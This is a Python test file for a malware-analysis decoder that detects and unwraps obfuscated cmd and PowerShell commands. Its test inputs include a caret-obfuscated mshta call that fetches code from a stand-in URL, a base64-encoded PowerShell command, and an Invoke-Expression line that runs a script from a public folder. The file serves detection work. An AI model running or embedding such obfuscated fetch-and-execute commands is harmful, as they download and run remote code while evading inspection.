import regex as re

from multidecoder.analyzers.shell import CMD_RE
from multidecoder.analyzers.shell import find_cmd_strings, find_powershell_strings
from multidecoder.analyzers.shell import get_cmd_command, get_powershell_command, strip_carets
from multidecoder.hit import Hit

test = b'SET.NAME(a , cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html)'


# CMD_RE
def test_cmd_re_empty():
    assert not re.search(CMD_RE, b'')


def test_cmd_re_command():
    assert re.match(CMD_RE, b'cmd command')


def test_cmd_re_mixed_case():
    assert re.match(CMD_RE, b'CmD CoMMaNd')


def test_cmd_re_carets():
    assert re.match(CMD_RE, b'c^m^d c^omman^d')


def test_cmd_re_quotes():
    assert re.match(CMD_RE, b'cmd /c ""echo bee""')


def test_cmd_re_ex1():
    match = re.search(CMD_RE, test)
    assert match and test[match.start(): match.end()] == b'cmd /c m^sh^t^a h^tt^p^:/^/some.url/x.html'


# strip_carets
def test_strip_carets_empty():
    assert strip_carets(b'') == b''


def test_strip_carets_no_caret():
    assert strip_carets(b'test') == b'test'


def test_strip_carets_caret():
    assert strip_carets(b'^') == b''


def test_strip_carets_escape_caret():
    assert strip_carets(b'^^') == b'^'


def test_strip_carets_trailing_caret():
    assert strip_carets(b'test^') == b'test'


def test_strip_carets_in_strnig():
    assert strip_carets(b'"^"') == b'"^"'


def test_strip_carets_line_continuation():
    assert strip_carets(b'start^\r\nend') == b'startend'


def test_strip_carets_unclosed_string():
    assert strip_carets(b'"test"" ^') == b'"test"" ^'


# find_cmd_strings
def test_find_cmd_strings():
    assert find_cmd_strings(test) == [
        Hit(value=b'cmd /c mshta http://some.url/x.html',
            start=13,
            end=55,
            obfuscation='unescape.shell.carets')
    ]


# find_powershell_strings
def test_find_powershell_strings_enc():
    ex = b'powershell /e ZQBj^AGgAbwAgAGIAZQ^BlAA=='
    assert find_powershell_strings(ex) == [
        Hit(value=b'powershell -Command echo bee',
            obfuscation='unescape.shell.carets/>powershell.base64',
            start=0,
            end=len(ex))
    ]


def test_find_powershell_for_loop():
    ex = b"for /f \"tokens=*\" %%a in ('powershell -Command \"hostname " \
         b"| %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"') do echo prx.%%a"
    assert find_powershell_strings(ex) == [
        Hit(value=b"powershell -Command \"hostname | %%{$_ -replace '[^a-zA-Z0-9]+', '_'}\"",
            obfuscation='',
            start=27,
            end=96)
    ]


def test_find_powershell_strings_invoke_expression():
    ex = b"Invoke-Expression 'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1'"
    assert find_powershell_strings(ex) == [
        Hit(value=b'PowerShell -ExecutionPolicy RemoteSigned -File C:\\Users\\Public\\mvbskt0pnk.PS1',
            obfuscation='',
            start=19,
            end=len(ex)-1)
    ]


# get_cmd_command
def test_get_cmd_command_empty():
    assert get_cmd_command(b'') == b''


def test_get_cmd_command_c():
    assert get_cmd_command(b'cmd/ccommand') == b'command'
    assert get_cmd_command(b'cmd.exe/ccommand') == b'command'


def test_get_cmd_command_k():
    assert get_cmd_command(b'cmd/kcommand') == b'command'
    assert get_cmd_command(b'cmd.exe/kcommand') == b'command'


def test_get_cmd_command_amp():
    assert get_cmd_command(b'cmd&command&command2&command3') == b'command&command2&command3'


def test_get_cmd_command_upper():
    assert get_cmd_command(b'CMD/CCOMMAND') == b'COMMAND'
    assert get_cmd_command(b'CMD/KCOMMAND') == b'COMMAND'


def test_get_cmd_command_nested():
    assert get_cmd_command(b'cmd /c cmd /c command') == b' cmd /c command'
    assert get_cmd_command(b'cmd /c cmd /k command') == b' cmd /k command'
    assert get_cmd_command(b'cmd /k cmd /c command') == b' cmd /c command'
    assert get_cmd_command(b'cmd /k cmd /k command') == b' cmd /k command'


# get_powershell_command
def test_get_powershell_command_empty():
    assert get_powershell_command(b'') == b''


def test_get_powershell_command_bare():
    assert get_powershell_command(b'powershell command') == b'command'
    assert get_powershell_command(b'pwsh command') == b'command'


def test_get_powershell_command_exe():
    assert get_powershell_command(b'powershell.exe command') == b'command'
    assert get_powershell_command(b'pwsh.exe command') == b'command'


def test_get_powershell_command_args():
    assert get_powershell_command(b'powershell -arg1 -arg2 command') == b'command'
